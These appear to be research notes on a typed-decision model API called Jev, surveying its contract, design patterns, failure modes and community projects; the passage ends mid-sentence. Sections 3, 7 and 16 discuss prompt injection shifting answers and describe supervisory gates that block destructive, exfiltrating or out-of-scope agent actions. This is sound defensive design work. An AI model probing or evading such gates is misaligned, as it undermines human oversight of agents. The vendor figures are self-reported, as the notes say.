# JEV research notes (baseline 2026-09-18)

## 1. What Jev is — contract facts (re-verify live before building)

- System One model: sends back **typed decisions, not text**. `POST
  https://api.typesafe.ai/v1/systemone`, body `{state, model, questions}`.
  SDKs: `typesafe-sdk` (Python 3.10+), `@typesafe-ai/sdk` (Node 20+).
  Default model alias `jev-latest` currently resolves to `jev-1.13.0`;
  **pin the version** (`model="jev-1.13.0"`) when thresholds are tuned, and
  log the response's `model` field.
- Three primitives. **Choice**: one of a fixed set, up to **255 options**,
  returns `choice` + full `probabilities` + `confidence`. Always add an
  explicit `other`/`none of the above` when coverage is uncertain. **Score**:
  position on 2–10 ordered, concretely described levels; returns fractional
  `score` (probability-weighted mean of level indices) + `probabilities` +
  `confidence` + `legend`. **Noul**: yes/no as a single probability
  `noul` in [0,1]; **no confidence field** — the number is the belief.
  Noul 0.5 = uncertainty between yes/no, NOT medium intensity.
- Parallelism: every question in one request sees the same state, is
  evaluated independently, costs only its tokens. Context: ~64k tokens for
  state + all questions, ~32k for state + longest question. Speculative
  questions are nearly free in latency (13-question cookbook: 12.2x cheaper,
  10.0x faster batched, answers identical).
- Performance envelope (TypeSafe's self-run numbers, unreproduced):
  70–500ms end-to-end, $0.042/MTok input, output free, ~$0.0004/case.
  Rate limits jev-1.13: 250k tokens/s, 1200 req/min, `429` + `retry-after`,
  SDKs retry with backoff. Limits move without notice.
- Training: RLCD (Reinforcement Learning for Calibrated Decisions), 2 years
  stealth, founder Diogo Almeida (ex-OpenAI, InstructGPT/RLHF lineage),
  ~$40M led by DCVC. Eval claim: 67.8% on 4 internal workflows, level with
  GPT-5.6 Terra at ~1/200 cost, ~1/50 latency — measured as agreement with a
  GPT-6 Astra + Fable 5.1 consensus, NOT ground-truth accuracy. Treat as a
  lead, not a fact.
- "Hallucination-free" means: output is always schema-valid (0% type
  errors by construction). It can still return the WRONG valid value.

## 2. Design patterns (empirical recipes, dated)

- Speculative fan-out (docs/patterns/fan-out + parallel_questions cookbook,
  2026-09): ask everything possibly-needed in one call; code ignores what
  doesn't apply. Second requests ONLY when the next state/options depend on
  an earlier answer (skill_suggestion top-3 refetch, autoformat block
  building, hierarchical beam descent).
- Confidence-gated routing: one threshold PER ACTION scaled to cost of being
  wrong (floor ~0.5 unsure → human; read-only acts low; money/safety acts
  high + confirm). Tune on own data; plot confidence vs accuracy.
- Composite scoring (docs/primitives/score#splitting): split fuzzy judgment
  into atomic one-dimension Scores, normalize each by its top level index,
  weight in code. Re-weighting is a code change, not a re-prompt.
- Cascades: Jev routes/filters cheaply → code handles the deterministic
  majority → frontier LLM takes the hard minority → human takes the
  uncertain tail. 1kpapers: $3.99 summarize + $0.08 classify for 1018 papers.
- Retrieve-then-judge: Jev knows ONLY the state it is handed. Retrieval
  quality ceilings everything; filter state to what each question needs
  (context rot is real and measured).
- Hierarchy/beam search (cookbook, jev-1.12, 4 labeled examples): parallel
  beam K=3 over Choice distributions with geometric-mean path score beat
  greedy 4/4 vs 2/4. Mechanism demo, not a general superiority proof.
- Skill suggestion (cookbook, jev-1.12, 488 requests): rank-182 Choice +
  gate nouls in ONE request, rerank top-3 with fits-nouls in a second;
  wrong loads 16.8%→7.3%, needless 9.8%→4.0%. THE canonical answer to
  "hundreds of micro-skills vs one fat skill": keep a full roster, add a
  cheap Jev rank-then-verify front door, suggest at most one skill per turn,
  allow rejection. Choice settles WHICH, nouls settle WHETHER.
- Rubric discipline: levels must describe concrete situations, never bare
  degrees or "worse than previous" (levels are judged independently, numbers
  invisible). Structured criteria objects (`what`/`not_for`/`examples`) with
  same field names across options; examples must resemble real inputs.
  Same Score, different risk: [0,1,0] vs [0.5,0,0.5] both score 1.0 —
  always read probabilities + confidence beside the score.

## 3. Jaggedness — official failure modes (jev-1.13, reviewed 2026-09-16)

Literal reading (answers what you wrote, not what you meant); no counting /
math / numeric interpolation between Score levels (iterate per-item Nouls in
code, keep arithmetic in code); dates are text (extract parts via Choice with
explicit not-stated, assemble/compare in code); indirection/double-negatives
cost accuracy (name state paths with backticks); large irrelevant state
distracts (filter first, Noul-relevance pre-filter); state is NOT treated as
hostile (prompt injection moves answers — your threat model); contradictory
instructions/criteria confuse (align them); NO generation (candidates from
regex/LLM/code, Jev selects).

## 4. Ecosystem (launch week, stars as of 2026-09-17/18 — re-check)

- typesafe-ai/skills (official agent skill, MIT): live-docs-as-source-of-truth
  protocol. Our skill LAYERS on top, never duplicates it.
- typesafe-ai/typesafe-sdk-python, typesafe-sdk-js (official clients);
  system-one-adapter-python (same typed interface over OpenAI/Anthropic).
- browser-use/jev-ultrafast (~2100★, 2026-09-16): dynamic indexed action
  space, operation+target heads in ONE request (speculative targets), small
  LLM only for TYPE_TEXT; 7.1s Flights demo, $0.0039; 1092→101 browser calls.
- jarrodwatts/jev-trader (453★, 2026-09-16): per-Monad-block buy/sell Choice,
  ~81ms model latency, 2-RPC hot loop, dry-run mode.
- devagrawal09/jev-review: staged code review (Noul risk matrix →
  Choice/Score file profiles → evidence → severity → routing) + dashboard.
- TheoLeeCJ/openjev (40-166★): open-model interface-pattern reproduction
  (direct logits, 4B model) — pattern only, not the model/training.
- vinnylarouge/jevlike: Jev-like one-pass option probabilities + Doom/chess
  vision demos with tensor diagrams.
- awlevin/typesafe-computer-use: $0.0002/step vs $0.032 Opus; key caveat:
  "every piece of reasoning the frontier model does for free has to be
  rebuilt here as deterministic state" (OCR + explicit date parsing).
- RomanSlack/jev-drone: 500Hz control + 50Hz safety in code, classical CV to
  symbols at 15Hz, Jev advisory ~2.5Hz (Choice maneuver + Score risk + Noul
  lost-vs-occluded). "Cannot be the perception layer or run at control rate."
- fhshaik/typesafe-mario: emulator RAM → object JSON → legal-action Choice,
  no screenshots. phyous/tsai-sc: 421 Jev decisions through StarCraft
  campaign with verification report.
- Community clients: s1-rs / typesafe-rs (Rust), typesafe_sdk (Elixir),
  Ruby, .NET, Rails, Advocaat (TS), HA-Jev (Home Assistant), pi-typesafe +
  pi-warden (Pi guardrails), jev-mcp / typesafe-mcp (MCP servers), jev-axi
  (AXI CLI: its own benchmark found agents read fewer files but cost the
  same — judgments, not reading replacement), jev-mobile (Android PoC),
  Bicameral (LLM writes, Jev reflexes), Every (per-function Noul code
  search), Crowdcheck (10k synthetic personas demo), HEIST//ONE (stealth
  game, 6 guards batched), TypeSafe Typewriter (16 live judgments demo).
- Evals/research: jev-rerank-bench, jev-spam-eval (zero-shot vs TF-IDF +
  post-hoc caveats), typesafe-ai-benchmark (Jev vs Qwen-on-Cerebras),
  pjburnhill gist (6-question Jev suitability test: judgement/bounded/
  context-contained/fast-human/machine-consumed).
- AbdelStark/awesome-typesafe (45★): curated index, labels private-data and
  single-run caveats, last reviewed 2026-09-17. Start hourly refresh here.

## 5. X launch signal (via web index 2026-09-18; X API creds absent)

Founder thread (@CompleteSkeptic, Sep 15): RLCD, 20-200x faster, 40-400x
cheaper. @typesafeai out-of-stealth + waitlist. TestingCatalog, AGTPinsights
summaries. Trending: Browser Use + Jev flights ($0.0039, 7s). Vercel AI
Gateway listing. Builder anecdotes: flight search, email sorting, trading
bot, 1018-paper classification. Sentiment: excitement + "different primitive,
not cheaper LLM". No verified independent benchmarks yet.

## 6. Coverage gaps / unknowns

- No independent reproduction of TypeSafe's own speed/cost/quality claims.
  MCTS+Jev now FOUND and analyzed: paulobueno164/jev-mcts + lhemerly/mcts-agent
  (see §8 and mappings.md empirical recipe); supersedes the earlier
  "not yet observed" note — MCTS-as-value-function is EMPIRICAL, pending
  third-party reproduction.
- 255-option Choice at scale (>255 candidates) has no canonical public
  recipe; tournament-bracket decomposition is UNPROVEN (see skill warnings).
- Score cross-question comparability and calibration on deployment
  populations: unmeasured. Thresholds from cookbooks are examples, not rules.
- Prices/limits/aliases will move; evals page (evals.typesafe.ai) and
  Discord #show-and-tell are the fastest-moving sources — check every pass.

## 7. Additions from 2026-09-18 refresh (marked new)

### Agent self-supervision is the strongest emerging pattern
- Foreman (203★): "wide generative loop + narrow supervisory loop" run concurrently; the supervisor estimates named probabilities (implementation_complete .91, tests_sufficient .34, worker_stuck .02, ready_to_finish .21) and deterministic policy with hysteresis gates continue/stop/retry/verify. Treat as semantic state estimation, NOT command generation.
- winnow + yoshi + fast-jev-compaction: judge artifact RELEVANCE before it enters context (one Noul per block/span); hide confident-no with a stub + recall key; keep current instruction, recent turns, errors, opaque blocks always.
- pi-jev / pi-warden / jev-judgment: gate actions BEFORE execution (destructive, exfil, beyond-scope, impact) with per-action thresholds; judge output AFTER execution (leaks_secret, failure_class); all error paths fail-open; shadow mode first.
- Structure: pre-action gate → post-action output judge → done-check (claim "done" without a passing test = block) → stuck-detector (3 same-strategy failures) → slop/done judgments on final reply.

### Skill routing/modularity (updates §2)
- SkillRanker (23★): ranks skills from live session context via hook; local feedback + calibration loop; context windowing drops reasoning blocks/prior advice; explicit fail-closed paths.
- DECRUX router: chunk 240/request, gate=mean of 3 judgments ≥0.30, winner 'fits' noul ≥0.40, shortlist 3, 700-char excerpt per candidate, two requests, opt-in, nothing injected when nothing fits.
- GodsBoy router: route/no_skill/review tri-state; 94.4% vs 70.8% lexical on 72 synthetic requests; exploratory caveat: questions revised after inspecting first full run (tuning leakage — note the practice, don't copy it silently).
- Modularity conclusion stands: full roster of small skills + cheap Jev rank-then-verify front door; frontmatter description IS the routing payload — write it for a 700-character excerpt and one-second judgment.

### Statistical discipline numbers
- Calibration holds near-distribution (ECE 0.0313, Archer Hume) but collapses out of distribution: 32% accuracy + 0.30 mean top-prob on novel 2-step word problems → Jev flags uncertainty instead of reasoning through it. Rule: never use Jev where the judgment requires a derivation; decompose until each question is observational. Architecture reconstruction (readout, isolation, IIA, confidence-as-arithmetic): §31. Not a new contract.
- Same Score ≠ same quality: [0,1,0] vs [0.5,0,0.5] both 1.0 (§1) — always read probabilities + confidence together.
- Open-model reverse engineering (openjev, openjev-sglang, jevmlx, NanoJev, reflex): consensus that the pattern is prefill-once + read typed option logits directly, no generation. Consistent with parallel fan-out behavior; treat as hypothesis about the closed model.

## 8. Topic-index pass (2026-09-18, ~80 more repos; archive = 184 clones)

- **Jev-as-a-judge, judge variance (danielgshea/jev-as-a-judge)**: 100 judge
  repetitions over 5 frozen agent outputs. Jev judge's ratings varied 224x
  LESS (quality metric) and 279x LESS (rubric) than a GPT judge's; outcome
  disagreement 0% vs 0.2%. Recipe: before trusting any judge (Jev or LLM),
  run repeated judgments over frozen outputs and compare spread, not just
  agreement. This is the measured basis for using Jev to test skills.
- **ndolinschi family (toolgate, harnessjudge, trustgate, swarmrouter,
  mcpmatch...)**: allow/ask_human/deny for planned tool calls; ok/retry/
  escalate/stop for agent steps — same gate vocabulary as pi-jev/pi-warden;
  a whole suite built on one judgment shape.
- **inanna-malick/jev-dsl (Haskell)**: questions written as typed packets,
  type-inferred, answers returned under the same labels as records; every
  answer consumed through a handler per alternative. Good reference for
  "callability": the branch that runs is always one the program wrote.
- **shamazharikh/qwen-rlcd (Qwen3.5-0.8B reproduction)**: mechanism =
  prefill state once, copy cache per branch, run every question+answer
  branch as one padded batch, read hidden state at last real token.
  Branches isolated by construction in both linear-attention and full
  attention layers → results cannot depend on question/option order.
  Confirms the openjev prefill-only hypothesis; hybrid-layer detail
  (18 DeltaNet + 6 attention) explains why naive tree masks fail.
- **awesome-jev-by-typesafe (410★)**: 18-case use-case map + production
  decision loop (inspect → evaluate → compose → gate → record → calibrate)
  and an explicit "what Jev is not" list. Already mirrored in skill; new
  only as: record-the-version step belongs in every decision card.

## 9. Optimizer/framework support (2026-09-18)
- ax-llm/ax: native `ai({name:'typesafe'})` signature adapter (boolean->Noul
  w/ trueThreshold local policy; class->Choice) + `typesafe().systemOne()`
  native client. TS-only (AxIR backlog). Adapter fails closed pre-network on
  optional/array/nested/numeric/freeform outputs; no streaming/temp/samples.
- DSPy: typesafeainate/dspy-typesafeify — @typesafeify(score_fields=...) reads
  signature output annotations (bool/Literal/score) and builds a hybrid plan:
  one Typesafe request for typed fields, generative LM after for freeform.
  PoC only; optimizer-aware tuning of thresholds NOT built.
- jev-dspy-lab: the measurement discipline for any such integration —
  dataset calibration w/ bootstrap CIs, selective-risk sweep, fail-closed
  abstention, canonical request hashes, confirmatory gate chosen pre-run
  (never report best sweep row).
- Skill: added references/optimizer-integration.md + index row.

## 10. Toolbox-mapping meta-method added to skill (2026-09-18)
New references/toolbox-mapping.md: the repeatable procedure for finding
approaches/applications for an out-of-distribution primitive — inventory a
classical toolbox family, locate its judgment-shaped component (answer in a
second, closed answer space, no derivation), substitute Jev, classify the win
(marginal substitute / newly-feasible via the 100-150x economics / invalid),
then falsify. Seeded table maps ~11 families to launch-week evidence; the
economics inversion ("what would I do at $0.0004/100ms per judgment?") is the
application-finder. Standing rejections recorded so they aren't rediscovered:
parallel-nouls-as-independent-evidence, Jev-as-p-value, cross-question Score
comparability, calibration-certifies-individual-answers.

## 11. Methods catalog + operators/theorems tier (2026-09-18)
New references/methods-catalog.md. Tier 1: named methods (CatBoost features
→ empirical recipe; judge qualification; screening; conformance checking...).
Tier 2: operators & theorems in three classes — substitutable operators
(argmax→Choice, expectation→Score, indicator→Noul), system-level theorems
with their governing preconditions (Bayes/independence, LLN/repeats-not-
parallel, Jensen/utility-from-distribution, Goodhart/probes-concede,
Simpson/per-population calibration, "re-ask-until-agrees" convergence
rejected), and non-substitutable constructs (arithmetic, gradients, CLT-on-
outputs, metric-space claims on Scores). Governing rule: every theorem's
preconditions become code-level checks; no named precondition = metaphor,
not mapping.

## 12. Composition algebra + application generator (2026-09-18)
New references/composition-algebra.md: 11 positions Jev can occupy relative
to any function/operator/algorithm (operand, post-judge, gate, selector,
comparator, prior, state-estimator/controller, optimizer metric, verifier,
discretizer, terminator) with per-position governing rules; logical
operators over Jev outputs (NOT multiplication for AND — ask the compound
question; ∀/∃ as batched-noul + code aggregation); cross-position invariants
(width-cheap/depth-linear, estimate≠measure, positional thresholds, oracle-
without-side-effects). The application generator = positions × constructs
traversal + economics inversion as the filter, replacing brainstorming;
a candidate is promoted only after falsification.

## 13. Full-archive analysis pass (2026-09-18)

- `jev-archive/analysis/evidence.csv`: 169 repos, per-repo README size, language, primitive/API usage, tests, threshold histograms. 186 clones (2 late adds: mizchi/jev-gomoku, joshbla/jev-plays-2048, arnabgho/rlcd-lite, dabit3/jev-experiments → 187), 0 failures.
- `jev-archive/analysis/findings.md`: deep-read distillation.
- New facts: calibre threshold non-transfer across datasets; jev-harness shadow-mode/gate/policy/eval-CLI pattern (24 rows: 48.9s claude CLI vs 1.3s Jev); parallelConstraintDecoding two-forward-pass schema fill + HF RLCD repo has no weights (stock Qwen2.5-1.5B + custom code); rlcd-lite GRPO+Brier proper-scoring-rule → calibration (binary reward doesn't calibrate); dabit3/jev-experiments 21 apps — latency-first taxonomy: streaming judges, keystroke-loop re-rank (seq-tagged, discard stale, judge-once/re-policy-in-code), pre-execution guards, swarm policies, realtime voice/meeting flows, spreadsheet formulas, accessibility-tree computer use, hybrid BM25→Jev re-rank (50%→100% top-1).

## 14. ProgramAsWeights assessment (2026-09-18)

- Cloned programasweights/programasweights-python; org has sdk-python, sdk-js (WASM), skills repo, paw-helper.
- Facts (Contract): NL spec → `.paw` = KV-cache prefix + optional LoRA over fixed interpreter (Qwen3-0.6B ~22MB / GPT-2 ~5MB, browser-capable); local, deterministic, no runtime API; ~0.03–0.5s/call; examples=[…] compile path; finetune compiler `paw-ft-bs48`; constrained decoding via llama.cpp logits_processor; offline mode fails closed; Hub at hub.programasweights.com.
- Relevance (Hypothesis, no measured integration in any archived repo): Jev as calibrated labeling teacher → PAW compile = distilled local judgment; or PAW shadowed with Jev as arbitration gate + drift signal. Non-pairing case: unstable decision surface. Test obligations written into optimizer-integration.md.

## 15. User-named batch deep reads (2026-09-18)

- dbreunig/building-with-jev-skill: best doc-grounded question-design/diagnosis skill found; distilled (source-attributed) into new reference `question-design.md`; SKILL.md mapping index updated. New doc facts recorded: 64k shared budget / 32k longest-question; instruction keys; confidence=peakedness; Noul no-confidence (distance from 0.5); score not quantity-interpolable; taxonomy-walk pattern; counting per-item; symptom table.
- dannote/jev: Elixir peer-process pattern (answers as messages, guards as policy, network-free tests).
- carlaiau/jev-reranking: TREC DL2019 — Jev zero-shot rerank MAP 0.4748 (best), nDCG@10 0.683 vs monoBERT 0.718; $0.76/41k pairs. First serious independent rerank benchmark; adjust rerank guidance honestly (competitive on MAP, behind best tuned cross-encoders on nDCG).
- riff: hybrid static+semantic linter, per-finding calibrated p, 14 calls $0.0004.
- open-typesafe-camoufox: $0.0002/step browser agent; 11-way action Choice; free text only when needed.
- hr98w/jev-visual: open Jev-like VLM direct-logit scoring; Breakout reduced to region classification (decomposition discipline).
- skillranker + jev-harness: previously analyzed (§7, findings.md).

## 16. Batch #5 (2026-09-18)

- probably-lang: Jev as control-flow primitive in a programming language (feeling-conditions as loop guards); judgment recordings + deterministic replay (record once, replay forever without credentials). New composition-algebra position: Jev as conditional operator / loop predicate.
- jev-search: Jev as both query-understanding head and result-ranking tail of a federated multi-engine search (speculative start, lane failures isolated, merge on URL+agreement+rank).
- super-jev: harness with permit() layer independent of confidence; idempotency keys; JSONL replay. Pattern: permission ≠ confidence — domain rules veto regardless of model certainty.

## 17. X+GH hourly scan (2026-09-18 ~13:39–14:39 UTC)

Raw artifacts: `research/archive/hourly/2026-09-18T14/` (USAGE-DIGEST,
theme-digest.json, github-topic-jev-last-hour.json). Method unchanged:
hourly archive + live HTTP checks; this pass's X coverage is a provided
theme digest (first ~400 posts) rather than X API. awesome-typesafe HEAD
moved `8b9e8aa3c44f` → `6eef30ba8c3f`. docs/evals/OpenRouter still HTTP 200.

### Discourse themes (counts from theme-digest)

| Theme | n | Design takeaway |
|---|---|---|
| cost/prefilter | 48 | Dominant: drop chunks/calls before the expensive generator |
| tool routing | 33 | Selector position; products (Toolrouter) + open harnesses |
| agent gate/linter | 27 | AGENTS.md as criteria; confidence gates; shadow mode |
| mixed architecture | 16 | Decision model + LLM writing; explicit anti-replacement |
| product ship | 14 | Moderation ~200ms, EffectTS SDK interest, HA, semantic SQL |
| reproduce/open | 13 | LightJev / open heads — training signal, not an Augustus clone |
| skepticism | 11 | "It's just classification" → answer *placement*, not novelty |
| rerank/search | 11 | Still a live mapping; LlamaIndex Jev rerank this hour |
| on-device/mobile | 2 | Thin evidence; newly-feasible candidate only |

Representative posts (do not treat as benchmarks):
- [@dt_sqr](https://x.com/i/status/2100957356389511173) — "Jev is classification. This is like the oldest task in AI"
- [@seb_jsilva](https://x.com/i/status/2100957104567685310) — mixed architecture, too early as stack replacement
- [@sydneyrunkle](https://x.com/i/status/2100956747729080714) — replace classification *steps* in agents
- [@buildwith_yash](https://x.com/i/status/2100957729208893516) — cheap irrelevance before the main model = cost, not just accuracy
- [@stoufax](https://x.com/i/status/2100956659128361097) — realtime chat moderation ~200ms (**Hypothesis** as a number)
- [@tool_router](https://x.com/i/status/2100957104752238821) — Toolrouter now routes with Jev
- [@hughesanalytics](https://x.com/i/status/2100957428799967514) — XGBoost is the trained-head alternative; Jev is flexibility
- [@whereischarly](https://x.com/i/status/2100955292150153225) — ECE ModernBERT 0.081 vs Jev 0.105 (**Hypothesis**; do not overwrite Archer Hume)

### GH movers (`topic:jev`, 34 repos in the hour) — novel shapes

Already-known stars still moving: awesome-typesafe 186★, skillranker 41★,
awesome-jev (AnotiaWang) 48★, jevmlx 19★, HA-Jev, jev-harness, jev-pref.

**New or newly-salient shapes (design, not APIs):**

- `ibrahemid/git-jev-stage` — per-hunk Choice include/exclude/mixed; exact
  patch; mixed stays unstaged; candidates from `git diff`.
- `ibrahemid/jevprune` — per-line relevance vs task; always-keep last-N +
  error signatures in code; full output recoverable.
- `WiktorB2004/llama-index-jev` — rerank **fails open** (BEIR nfcorpus
  MiniLM 0.340 → +Jev 0.396 nDCG@5); select **fails closed**. First clean
  public statement of per-action fail policy.
- `doeixd/jev-pref` — AGENTS.md prefs → Jev linter; YOU define the rule /
  JEV classifies evidence / CODE maps outcome / AGENT acts.
- `yousudip/lizard-agent` — browser loop with no LLM; extractive answers;
  prices/dates never touch the model.
- `kylemclaren/jevql` — semantic predicates as SQL `jev()` / `jev_prob()`;
  database sees ordinary SQL (CLI rewrite).
- `harrymunro/decision-first` — neighbor skill (try Jev first + lab log).
  Augustus does not absorb it.
- `simota/tenbin` — neighbor skill (design-time lint/eval/thresholds).
  Augustus does not absorb it.
- `aaravriyer193/OpenSmoke` — Jev over every agent step; LLM only on
  flagged runs (attention cascade).
- `frostney/clean-code-review`, `Eliran-Turgeman/repear`,
  `DanRWilloughby/snifftest` — rubric/smell/prose linters; snifftest makes
  the 0.5-unsure-band a non-flag.
- `luantak/is-malicious` — high-stakes pre-run Noul; fail closed + sandbox.
- `FirasSX914/Janus` — measure Jev vs other models on your data, then route
  (calibre's lesson as a product).
- `rongxinzy/LightJev` — train lightweight decision backbones. Record as
  reproduce/open; not an Augustus implementation task.
- Also this hour: refgarden, jevocks, xerify, ground-truth, jevcode,
  typesafe-sdk-java, several awesome-jev forks.

### Skill impact

New reference `references/mixed-architecture.md` + SKILL.md index rows and
the classification non-negotiable. Identity lock: Augustus stays
placement/method/falsification; `typesafe-ai` / `tenbin` / `decision-first`
keep contracts, measurement, and habit. No API fields invented this pass —
docs.typesafe.ai/llms.txt re-fetched HTTP 200; cookbook list unchanged
enough that sources.json docs rows stand.

## 18. Laya — open Choice/Score/Noul head (2026-09-18)

Source: [convaiinnovations/laya](https://huggingface.co/convaiinnovations/laya)
(Apache 2.0; PyPI `laya`; demo Space `convaiinnovations/laya-demo`).
Companion writeup on DEV is advocacy, not an independent bench.

**What it is (vendor card, Hypothesis until you measure):** a
self-hostable, non-autoregressive System-1 decision model with the same
three question types as TypeSafe Jev — Choice (winner + per-option
probabilities + confidence), Score (expected level + distribution +
confidence), Noul (P(true) in [0,1]). Text (or JSON-as-text) in; typed
answers out; no generation. Backbone: ModernBERT-large + a small decision
head (~421M). Multi-question in one forward pass. Claims RLCD-style
training with a proper scoring-rule reward.

**What it is not:** a TypeSafe API drop-in, a multimodal/omni model, or a
reason to fork Augustus into an install guide. Do not copy `laya.predict`
shapes into this skill — their package owns that contract; `typesafe-ai`
owns Jev's.

**Limits the card itself states:** text-only, English, **512 tokens per
question** (question + options + state; longer state truncated);
arithmetic / counting / date compare / multi-hop stay in code; evaluate
calibration on *your* distribution before automating.

**Tradeoff vs TypeSafe Jev (design, not a bake-off):**

| Axis | TypeSafe Jev (primary) | Open head (Laya as the example) |
|---|---|---|
| Mission fit | Documented API, 64k/32k envelope, live docs | Self-host, no egress, $0 inference after GPU |
| Calibration | Closed model; still re-measure on your data | You own eval end-to-end; weights are inspectable |
| Context | ~64k shared / 32k longest question (**Contract**) | 512 tok/question — prefilter state harder |
| Modality | See live docs; not assumed here | Text-only |
| Benches | TypeSafe self-run workflows (lead, not fact) | Vendor table vs Jev (latency/acc) — **claims** |

Their own eval split is the useful number, not the vs-Jev table: in-task
macro acc 0.838 / ECE 0.060 vs **zero-shot** acc 0.651 / ECE 0.207. Same
lesson as Archer Hume (§7): in-distribution calibration is not a license
to skip a held-out test.

**Augustus implication:** mappings, boundaries, and decision-design cards
name a *typed judgment provider*, not a vendor. Default provider remains
TypeSafe Jev (`typesafe-ai` + live docs). An open head is in play when
self-hosting or air-gap is the constraint *and* the 512-tok / text-only
envelope still fits the state — then the falsifying experiment is on that
head, on your labels, not on the vendor plot. LightJev / openjev stay the
"train or reproduce a backbone" bucket; Laya is the first shipped open
*product* with the Jev-shaped interface.

## 19. The judgment-model class (2026-09-18, literature + skill-scope)

Augustus's design surface is the **class** of fast/cheap
categorization-classification-scoring models, not TypeSafe Jev alone. Jev
remains the documented exemplar. This pass is literature + identity, not a
new X+GH hour (hourly method unchanged; last scan still
`archive/hourly/2026-09-18T14/`).

**In-class test.** Language or structured text (or image + closed
label/region set) in; score / distribution / label out; latency in the
per-chunk / per-hunk / per-frame band; code owns side effects. Out of
class: prompt→JSON LLMs, working regexes, trained heads on a frozen
taxonomy with enough of *your* data.

**Families (skill card `references/judgment-class.md`):**

| Family | Objective | Gate? |
|---|---|---|
| Closed decision API (Jev) | Proper-scoring / RLCD; Choice/Score/Noul | Yes, after your thresholds |
| Open System-1 head (Laya, openjev, LightJev) | Same *shape*; you host | Yes, after *your* ECE |
| GLiClass-adjacent | One-pass text+all-labels; sigmoid/softmax affinities | Sieve yes; silent authorize no |
| Listwise / pairwise ranker | Order (nDCG, ListNet); often translation-invariant | Fail open only |
| Vision scorer | CLIP/SigLIP affinity or region Choice | Calibrate; not VLM-as-judge |

**GLiClass (Empirical recipe as a paper, Hypothesis as a drop-in).**
[GLiClass: Generalist Lightweight Model for Sequence Classification
Tasks](https://arxiv.org/abs/2508.07662) (2508.07662). Joint encode of
text + all labels in one forward pass (labels interact; not sequential
cross-encoder pairs). Docs:
[Knowledgator intro](https://docs.knowledgator.com/docs/frameworks/gliclass/intro/).
Cousins: GLiNER (spans), NLI zero-shot, SetFit, ModernBERT heads. Design
use: large or changing tag sets, multi-label sieves. Not a gateable
decision API without a calibration plot on your labels. Jev's 255-option
Choice limit is Jev's, not the class's — this family is why.

**Listwise discriminative vs decision objectives.** The fail-open /
fail-closed fork. [Joint Optimization of Ranking and Calibration with
Contextualized Hybrid Model](https://arxiv.org/abs/2208.06164)
(2208.06164): many listwise losses (ListNet softmax-over-list) are
translation-invariant — adding a constant does not change ranking and
destroys any reading as P(click)/P(relevant). [Regression Compatible
Listwise Objectives for Calibrated Ranking with Binary
Relevance](https://arxiv.org/abs/2211.01494) (2211.01494, RCR) is the
patch *inside* ranking, not a reason to treat an off-the-shelf
cross-encoder as a decision API. Jev's product claim (act/abstain) lives
on proper scoring (log/Brier/spherical; RLCD — `arnabgho/rlcd-lite` in
the archive). Open heads that copy Choice/Score/Noul without that train
loop may *look* like Jev and still be uncalibrated. Rule already in
applied-mappings §4, now class-general: ranking error → quality → fail
open; selection/auth → control → fail closed, needs a decision-shaped
number. A listwise reranker *as* the gate is the rejected design.

**Vision scoring patterns.** Perception = candidate generation + scoring
(keep/drop card with pixels or an AX tree as the parser). Four postures:

1. Pixel-free (preferred when the environment is structured): RAM / AX /
   object JSON → closed action or region set → Choice. Launch-week:
   typesafe-mario, jev-drone, lizard-agent. The model never sees a
   screenshot.
2. Region/label Choice over extracted boxes. `hr98w/jev-visual`: Breakout
   only after reducing control to "which region holds the ball."
3. Dual-encoder affinity. CLIP softmax = competition in the offered set;
   SigLIP pairwise sigmoid = affinity, flatter closed-set margins
   ([SigLIP docs](https://huggingface.co/docs/transformers/v4.39.2/en/model_doc/siglip);
   posture note [2510.13364](https://arxiv.org/abs/2510.13364)). Class-
   conditional coverage can collapse under shift even when marginal
   coverage looks fine ([2608.19376](https://arxiv.org/abs/2608.19376)).
4. VLM-as-judge is *generation*. Verbal scores are not calibrated.

Laya is text-only / 512 tok: a vision hole is not "run Laya on a
caption."

**Portents for agent architecture** (independent of vendor — Hypothesis
as a product roadmap, Contract as a design pressure from the economics
already in the archive):

1. Full-traffic, not sampled (OpenSmoke, jevprune, git-jev-stage, firehose).
2. Skills/tools = catalog + decision, not a stuffed system prompt.
   Large catalogs may prefer GLiClass-adjacent one-pass.
3. Two numbers, two jobs: ranking orders context; decision authorizes.
4. Perception is not narration: extract candidates, score, act.
5. Open heads make the control plane local (air-gap / HA) *if* self-eval
   is accepted.
6. Cross-modal is still thin; "Jev but for images" is a hole, not a
   shipped omni API.
7. Generator-only agents are incomplete; ranker-only agents can sort
   and cannot abstain.

**Skill impact.** New reference `references/judgment-class.md`; SKILL.md
opening/protocol/index/design-card/family slot; FAQ rows for family
choice, GLiClass vs Jev vs cross-encoder, CLIP gating; mixed-architecture
and applied-mappings intros point at the class. Identity lock holds:
still not `typesafe-ai` / `tenbin` / `decision-first`, and not a Laya or
GLiClass how-to. No API fields invented.

## 20. Formal / semi-formal / crossover (2026-09-18, from brief)

Curriculum file `FORMAL-METHODS-SYSTEM-ONE.md` had **not** landed in the
repo or on GitHub search. Card written from the brief + fetched docs
(HTTP 200 unless noted). Skill: `references/formal-methods.md`.

**Ownership split (the load-bearing claim).** Proof/MC/contracts exhaust
a model or fragment. DST searches executions; a clean run is not a
proof. A judgment-class model estimates a *state*. Code owns
authorization. Judgment = sensor; proof/types = constraint; DST =
searchlight. Existing grammar already said this (composition-algebra
positions 3 and 9; estimate ≠ measure); this card names the tools.

**Design-time finders/checkers.** Alloy (scoped SAT instances), TLA+
(TLC/Apalache), Quint (TLA fragment; simulator ≠ proof; no TLAPS —
[FAQ](https://quint.sh/faq)), P, NuSMV, PRISM (model-p is not a Noul),
Event-B/Rodin ([wiki](https://wiki.event-b.org/index.php/Main_Page);
event-b.org itself failed HEAD this pass). Hole: triage
counterexamples / properties / POs. Not: close the obligation.

**Deductive.** Dafny, OpenJML, Frama-C, SPARK/GNATprove. Ranking failed
VCs is in-class; "the lemma holds" as a Noul is out.

**DST.** [Antithesis](https://antithesis.com/docs/introduction/how_antithesis_works/)
(deterministic hypervisor, properties, reproducible timelines).
[Resonate](https://docs.resonatehq.io/evaluate/how-resonate-is-tested):
Lean 4 protocol spec + differential oracle + DST of the TS SDK (CI
replays each seed twice to catch nondeterminism). Three owners in one
product.

**Harms.** TOCTOU-shaped soft checks (judge at t0, act at t1). Soundness
theater (toy bounds; tautological properties; Noul-as-safety-case).
[Hillel Wayne, 10 Mar 2026, "LLMs are bad at vibing
specifications"](https://buttondown.com/hillelwayne/archive/llms-are-bad-at-vibing-specifications/):
4% of GitHub TLA+ files mention Claude; example Alloy spec did not
compile and asserted tautologies; LLMs write "obvious" invariants, not
subtle concurrency/liveness. Force multiplier for experts who *run the
